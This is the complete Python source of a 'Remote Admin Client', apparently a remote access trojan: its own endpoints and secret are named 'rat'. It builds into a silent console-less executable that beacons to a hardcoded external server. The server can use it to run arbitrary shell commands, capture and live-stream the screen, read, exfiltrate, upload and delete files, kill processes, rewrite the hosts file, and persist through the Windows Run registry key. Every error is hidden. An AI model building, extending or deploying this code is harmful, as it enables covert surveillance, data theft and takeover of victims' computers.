"""
Remote Admin Client
-------------------
Connects to your Next.js admin dashboard.

Build as silent .exe:
    pip install pyinstaller pillow requests psutil pyqt5
    pyinstaller --onefile --noconsole main.py
"""

from __future__ import annotations

import base64
import json
import os
import platform
import socket
import subprocess
import sys
import threading
import time
import traceback
import uuid
from datetime import datetime
from io import BytesIO
from pathlib import Path
from typing import Dict, List, Optional, Tuple

import requests

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

if sys.platform == "win32":
    import winreg

# ═══════════════════════════════════════════════════════════════════════════
#  CONFIG  -- edit before building
# ═══════════════════════════════════════════════════════════════════════════
SERVER_URL     = "https://getpassion.xyz"
HEARTBEAT_SECS = 5
STREAM_SECS    = 0.25          # ~4 fps
JPEG_QUALITY   = 55
STARTUP_NAME   = "RemoteAdminClient"
RAT_SECRET     = "your_rat_secret_here"   # must match RAT_SECRET env var on server
# ═══════════════════════════════════════════════════════════════════════════

HEARTBEAT_URL = f"{SERVER_URL}/api/rat/heartbeat"
ACK_URL       = f"{SERVER_URL}/api/rat/commands/{{cmd_id}}/ack"

# ── Persistent HWID ───────────────────────────────────────────────────────────
def _hwid_path():
    if sys.platform == "win32":
        base = Path(os.environ.get("APPDATA", str(Path.home())))
    else:
        base = Path.home() / ".config"
    base.mkdir(parents=True, exist_ok=True)
    return base / ".ra_hwid"

def get_hwid():
    p = _hwid_path()
    if p.exists():
        return p.read_text().strip()
    hwid = str(uuid.uuid4())
    p.write_text(hwid)
    return hwid

HOSTNAME = socket.gethostname()
USERNAME = os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"
PLATFORM = platform.system()
HWID     = get_hwid()

# ── Screenshot ────────────────────────────────────────────────────────────────
def capture_screenshot():
    # type: () -> Optional[str]
    """Returns raw base64 JPEG (no data URI prefix)."""
    try:
        if ImageGrab:
            img = ImageGrab.grab()
        else:
            import shutil, tempfile
            if not shutil.which("scrot"):
                return None
            tmp = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
            tmp.close()
            subprocess.run(["scrot", tmp.name], check=True, timeout=5)
            from PIL import Image
            img = Image.open(tmp.name)
            os.unlink(tmp.name)
        buf = BytesIO()
        img.convert("RGB").save(buf, format="JPEG", quality=JPEG_QUALITY)
        return base64.b64encode(buf.getvalue()).decode()
    except Exception:
        return None

# ── Stream thread ─────────────────────────────────────────────────────────────
_streaming     = False
_stream_thread = None   # type: Optional[threading.Thread]
_session_ref   = None   # type: Optional[requests.Session]

def _stream_loop():
    global _streaming
    while _streaming:
        b64 = capture_screenshot()
        if b64 and _session_ref:
            try:
                _session_ref.post(
                    HEARTBEAT_URL,
                    json={
                        "hostname": HOSTNAME, "username": USERNAME,
                        "platform": PLATFORM, "hwid": HWID,
                        "stream_frame_b64": b64,
                    },
                    timeout=10,
                )
            except Exception:
                pass
        time.sleep(STREAM_SECS)

def start_stream():
    global _streaming, _stream_thread
    if _streaming:
        return
    _streaming = True
    _stream_thread = threading.Thread(target=_stream_loop, daemon=True)
    _stream_thread.start()

def stop_stream():
    global _streaming
    _streaming = False

# ── ACK a command ─────────────────────────────────────────────────────────────
def ack_command(session, cmd_id):
    # type: (requests.Session, str) -> None
    """Mark a command as done so the server never re-delivers it."""
    try:
        session.post(
            ACK_URL.format(cmd_id=cmd_id),
            headers={"x-rat-secret": RAT_SECRET},
            timeout=8,
        )
    except Exception:
        pass

# ── Startup (Windows registry) ────────────────────────────────────────────────
def _exe_path():
    return sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)

def startup_enable():
    if sys.platform != "win32":
        return
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, STARTUP_NAME, 0, winreg.REG_SZ, '"{}"'.format(_exe_path()))
        winreg.CloseKey(key)
    except Exception:
        pass

def startup_disable():
    if sys.platform != "win32":
        return
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(key, STARTUP_NAME)
        winreg.CloseKey(key)
    except Exception:
        pass

# ── Blocked sites ─────────────────────────────────────────────────────────────
HOSTS_PATH = (
    r"C:\Windows\System32\drivers\etc\hosts"
    if sys.platform == "win32" else "/etc/hosts"
)
BLOCK_TAG = "# __ra_block__"

BLOCK_KEYWORDS = [
    "porn", "xxx", "sex", "nsfw", "hentai",
    "xvideos", "pornhub", "xnxx", "redtube", "onlyfans",
]

BROWSER_PROCS = [
    "chrome.exe", "firefox.exe", "msedge.exe", "opera.exe",
    "brave.exe", "iexplore.exe", "chrome", "firefox", "safari", "brave",
]

_current_blocked = []  # type: List[str]

def _apply_hosts(domains):
    try:
        with open(HOSTS_PATH, "r") as f:
            lines = f.readlines()
        lines = [l for l in lines if BLOCK_TAG not in l]
        for d in domains:
            lines.append("127.0.0.1 {} {}\n".format(d, BLOCK_TAG))
            lines.append("127.0.0.1 www.{} {}\n".format(d, BLOCK_TAG))
        with open(HOSTS_PATH, "w") as f:
            f.writelines(lines)
    except Exception:
        pass

def _keywords_in(domains):
    for d in domains:
        for kw in BLOCK_KEYWORDS:
            if kw in d.lower():
                return True
    return False

def _kill_browsers():
    if HAS_PSUTIL:
        for proc in psutil.process_iter(["name"]):
            try:
                if proc.info["name"] and proc.info["name"].lower() in [b.lower() for b in BROWSER_PROCS]:
                    proc.kill()
            except Exception:
                pass
    elif sys.platform == "win32":
        for b in ["chrome.exe", "firefox.exe", "msedge.exe", "opera.exe", "brave.exe"]:
            subprocess.run(["taskkill", "/F", "/IM", b], capture_output=True)

def sync_blocked(domains):
    # type: (List[str]) -> None
    global _current_blocked
    if sorted(domains) == sorted(_current_blocked):
        return
    _apply_hosts(domains)
    new_domains = [d for d in domains if d not in _current_blocked]
    if _keywords_in(new_domains):
        _kill_browsers()
    _current_blocked = list(domains)

def add_blocked(domains):
    merged = list(set(_current_blocked + domains))
    sync_blocked(merged)

def remove_blocked(domains):
    remaining = [d for d in _current_blocked if d not in domains]
    sync_blocked(remaining)

# ── Process list ──────────────────────────────────────────────────────────────
def get_processes():
    procs = []
    if HAS_PSUTIL:
        for p in psutil.process_iter(["pid", "name", "cpu_percent", "memory_info", "status"]):
            try:
                info = p.info
                mem  = info["memory_info"].rss if info.get("memory_info") else 0
                procs.append({
                    "pid":    info["pid"] or 0,
                    "name":   info["name"] or "",
                    "cpu":    round(float(info.get("cpu_percent") or 0.0), 1),
                    "mem":    mem,
                    "status": info.get("status") or "unknown",
                })
            except Exception:
                pass
    elif sys.platform == "win32":
        try:
            raw = subprocess.check_output(
                ["tasklist", "/FO", "CSV", "/NH"], timeout=10, text=True
            )
            for line in raw.strip().splitlines():
                parts = [x.strip('"') for x in line.split('","')]
                if len(parts) >= 5:
                    try:
                        mem_bytes = int(
                            parts[4].replace(",", "").replace("\xa0K", "")
                                    .replace(" K", "").strip()
                        ) * 1024
                    except Exception:
                        mem_bytes = 0
                    procs.append({
                        "pid":    int(parts[1]) if parts[1].isdigit() else 0,
                        "name":   parts[0],
                        "cpu":    0.0,
                        "mem":    mem_bytes,
                        "status": "running",
                    })
        except Exception:
            pass
    else:
        try:
            raw = subprocess.check_output(["ps", "aux"], timeout=10, text=True)
            for line in raw.strip().splitlines()[1:]:
                cols = line.split(None, 10)
                if len(cols) >= 11:
                    procs.append({
                        "pid":    int(cols[1]) if cols[1].isdigit() else 0,
                        "name":   cols[10][:80],
                        "cpu":    float(cols[2]) if cols[2].replace(".", "").isdigit() else 0.0,
                        "mem":    0,
                        "status": "running",
                    })
        except Exception:
            pass
    return procs[:500]

# ── File listing ──────────────────────────────────────────────────────────────
def list_files(path):
    # type: (str) -> Tuple[List[Dict], str]
    try:
        p = Path(path)
        if not p.exists():
            return [], str(p)
        entries = []
        for item in sorted(p.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower())):
            try:
                stat = item.stat()
                entries.append({
                    "name":     item.name,
                    "path":     str(item),
                    "is_dir":   item.is_dir(),
                    "size":     stat.st_size if item.is_file() else 0,
                    "modified": datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M"),
                })
            except Exception:
                pass
        return entries, str(p)
    except Exception as e:
        return [], str(e)

def read_text_file(path):
    # type: (str) -> str
    MAX_BYTES = 102400
    try:
        data = Path(path).read_bytes()
        truncated = len(data) > MAX_BYTES
        data = data[:MAX_BYTES]
        for enc in ("utf-8", "utf-16", "latin-1", "cp1252"):
            try:
                text = data.decode(enc)
                if truncated:
                    text += "\n\n[... truncated at 100 KB ...]"
                return text
            except Exception:
                continue
        return "[binary file — cannot display as text]"
    except Exception as e:
        return "[read error] {}".format(e)

# ── Message popup (PyQt5 with ctypes fallback) ────────────────────────────────
_pending_replies = []  # type: List[str]
_popup_lock      = threading.Lock()
_popup_open      = False

def show_message_popup(body):
    # type: (str) -> None
    global _popup_open
    with _popup_lock:
        if _popup_open:
            _pending_replies.append("[queued] {}".format(body))
            return
        _popup_open = True

    def _run():
        global _popup_open
        try:
            from PyQt5.QtWidgets import (
                QApplication, QWidget, QVBoxLayout, QHBoxLayout,
                QLabel, QLineEdit, QPushButton, QTextEdit, QDesktopWidget,
            )
            from PyQt5.QtCore import Qt

            app = QApplication.instance() or QApplication(sys.argv)

            win = QWidget()
            win.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
            win.setFixedSize(420, 260)
            win.setStyleSheet("""
                QWidget { background: #0d0a0b; color: #e5e3e4; }
                QTextEdit {
                    background: #161014; border: 1px solid #2e292b;
                    border-radius: 6px; padding: 8px; font-size: 13px; color: #c5c0c2;
                }
                QLineEdit {
                    background: #0f0b0c; border: 1px solid #2e292b;
                    border-radius: 6px; padding: 6px 10px; font-size: 12px; color: #c5c0c2;
                }
                QLineEdit:focus { border-color: #4e4447; }
                QPushButton {
                    background: #1c1418; border: 1px solid #2e292b;
                    border-radius: 6px; padding: 6px 16px; font-size: 12px; color: #868283;
                }
                QPushButton:hover { background: #2a1a1b; color: #e5e3e4; border-color: #4a4448; }
                QPushButton#send {
                    background: rgba(220,38,37,0.12); border-color: #dc262544; color: #dc2625;
                }
                QPushButton#send:hover { background: rgba(220,38,37,0.22); }
            """)

            layout = QVBoxLayout(win)
            layout.setContentsMargins(18, 14, 18, 14)
            layout.setSpacing(10)

            title_row = QHBoxLayout()
            title = QLabel("● Message")
            title.setStyleSheet("color: #dc2625; font-size: 12px; font-weight: bold;")
            title_row.addWidget(title)
            title_row.addStretch()
            layout.addLayout(title_row)

            msg_box = QTextEdit()
            msg_box.setReadOnly(True)
            msg_box.setPlainText(body)
            msg_box.setFixedHeight(100)
            layout.addWidget(msg_box)

            reply_input = QLineEdit()
            reply_input.setPlaceholderText("Type a reply… (optional)")
            layout.addWidget(reply_input)

            btn_row = QHBoxLayout()
            btn_row.addStretch()
            dismiss_btn = QPushButton("Dismiss")
            send_btn    = QPushButton("Send Reply")
            send_btn.setObjectName("send")
            btn_row.addWidget(dismiss_btn)
            btn_row.addWidget(send_btn)
            layout.addLayout(btn_row)

            win._drag_pos = None
            def mousePressEvent(e):
                if e.button() == Qt.LeftButton:
                    win._drag_pos = e.globalPos() - win.frameGeometry().topLeft()
            def mouseMoveEvent(e):
                if win._drag_pos and e.buttons() == Qt.LeftButton:
                    win.move(e.globalPos() - win._drag_pos)
            win.mousePressEvent = mousePressEvent
            win.mouseMoveEvent  = mouseMoveEvent

            screen = QDesktopWidget().screenGeometry()
            win.move(
                (screen.width()  - win.width())  // 2,
                (screen.height() - win.height()) // 2,
            )

            def on_send():
                reply = reply_input.text().strip()
                if reply:
                    with _popup_lock:
                        _pending_replies.append(reply)
                win.close()

            def on_dismiss():
                win.close()

            send_btn.clicked.connect(on_send)
            dismiss_btn.clicked.connect(on_dismiss)
            reply_input.returnPressed.connect(on_send)

            win.show()
            app.exec_()

        except Exception:
            try:
                import ctypes
                ctypes.windll.user32.MessageBoxW(0, body, "Message", 0x40)
            except Exception:
                pass
        finally:
            with _popup_lock:
                _popup_open = False

    threading.Thread(target=_run, daemon=True).start()

# ── Command handler ───────────────────────────────────────────────────────────
def handle_command(cmd):
    # type: (Dict) -> Dict
    ctype   = cmd.get("type", "")
    payload = cmd.get("payload") or {}
    result  = {}  # type: Dict

    if ctype == "screenshot":
        b64 = capture_screenshot()
        if b64:
            result["screenshot_b64"] = b64

    elif ctype == "stream_start":
        start_stream()

    elif ctype == "stream_stop":
        stop_stream()

    elif ctype == "shell":
        command = payload.get("command", "")
        try:
            out = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT, timeout=30, text=True
            )
        except subprocess.CalledProcessError as e:
            out = e.output or ""
        except Exception as e:
            out = str(e)
        result["message_reply"] = out[:8000]

    elif ctype == "message":
        body = payload.get("body") or payload.get("text", "")
        if body:
            show_message_popup(body)
        result["message_reply"] = body

    elif ctype == "file_list":
        path = payload.get("path") or str(Path.home())
        entries, cwd = list_files(path)
        result["files_json"] = json.dumps(entries)
        result["file_cwd"]   = cwd

    elif ctype == "file_read":
        path = payload.get("path", "")
        content = read_text_file(path)
        result["message_reply"] = "[file_read: {}]\n\n{}".format(path, content)

    elif ctype == "file_download":
        file_path = payload.get("path", "")
        try:
            data = Path(file_path).read_bytes()
            result["file_upload_b64"]  = base64.b64encode(data).decode()
            result["file_upload_path"] = file_path
        except Exception as e:
            result["message_reply"] = "[file_download error] {}".format(e)

    elif ctype == "file_upload":
        b64      = payload.get("data_b64", "")
        dest_dir = payload.get("path") or str(Path.home())
        name     = payload.get("name", "upload")
        dest     = str(Path(dest_dir) / name)
        try:
            Path(dest).write_bytes(base64.b64decode(b64))
            result["message_reply"] = "[file_upload] saved to {}".format(dest)
        except Exception as e:
            result["message_reply"] = "[file_upload error] {}".format(e)

    elif ctype == "file_delete":
        file_path = payload.get("path", "")
        try:
            p = Path(file_path)
            if p.is_dir():
                import shutil
                shutil.rmtree(p)
            else:
                p.unlink()
            result["message_reply"] = "[file_delete] deleted {}".format(file_path)
        except Exception as e:
            result["message_reply"] = "[file_delete error] {}".format(e)

    elif ctype == "process_list":
        result["processes_json"] = json.dumps(get_processes())

    elif ctype == "process_kill":
        pid = payload.get("pid")
        try:
            if HAS_PSUTIL:
                psutil.Process(int(pid)).kill()
            elif sys.platform == "win32":
                subprocess.run(["taskkill", "/PID", str(pid), "/F"], timeout=5)
            else:
                os.kill(int(pid), 9)
            result["message_reply"] = "[process_kill] PID {} terminated".format(pid)
        except Exception as e:
            result["message_reply"] = "[process_kill error] {}".format(e)

    elif ctype == "block_sites":
        domains = payload.get("domains", [])
        add_blocked(domains)
        result["message_reply"] = "[block_sites] applied {} domains".format(len(domains))

    elif ctype == "unblock_sites":
        domains = payload.get("domains", [])
        remove_blocked(domains)
        result["message_reply"] = "[unblock_sites] removed {} domains".format(len(domains))

    elif ctype == "startup_enable":
        startup_enable()
        result["message_reply"] = "[startup] enabled"

    elif ctype == "startup_disable":
        startup_disable()
        result["message_reply"] = "[startup] disabled"

    return result

# ── Main heartbeat loop ───────────────────────────────────────────────────────
def run():
    global _session_ref
    session = requests.Session()
    session.headers.update({"Content-Type": "application/json"})
    _session_ref = session

    while True:
        try:
            # Flush any pending popup replies
            replies_to_send = []
            with _popup_lock:
                replies_to_send = list(_pending_replies)
                _pending_replies.clear()

            hb_body = {
                "hostname": HOSTNAME,
                "username": USERNAME,
                "platform": PLATFORM,
                "hwid":     HWID,
            }
            if replies_to_send:
                hb_body["message_reply"] = "\n---\n".join(replies_to_send)

            resp = session.post(HEARTBEAT_URL, json=hb_body, timeout=15)

            if resp.ok:
                data = resp.json()

                # Sync blocked sites from server
                sync_blocked(data.get("blocked_sites", []))

                # Handle each pending command then ACK immediately
                for cmd in data.get("commands", []):
                    cmd_id = cmd.get("id")
                    try:
                        extra = handle_command(cmd)
                    except Exception:
                        extra = {"message_reply": traceback.format_exc()[:2000]}

                    # ACK first so it is never re-delivered even if result send fails
                    if cmd_id:
                        ack_command(session, cmd_id)

                    # Send result back
                    if extra:
                        try:
                            session.post(
                                HEARTBEAT_URL,
                                json={
                                    "hostname": HOSTNAME,
                                    "username": USERNAME,
                                    "platform": PLATFORM,
                                    "hwid":     HWID,
                                    **extra,
                                },
                                timeout=15,
                            )
                        except Exception:
                            pass

        except requests.exceptions.ConnectionError:
            pass
        except Exception:
            pass

        time.sleep(HEARTBEAT_SECS)


if __name__ == "__main__":
    run()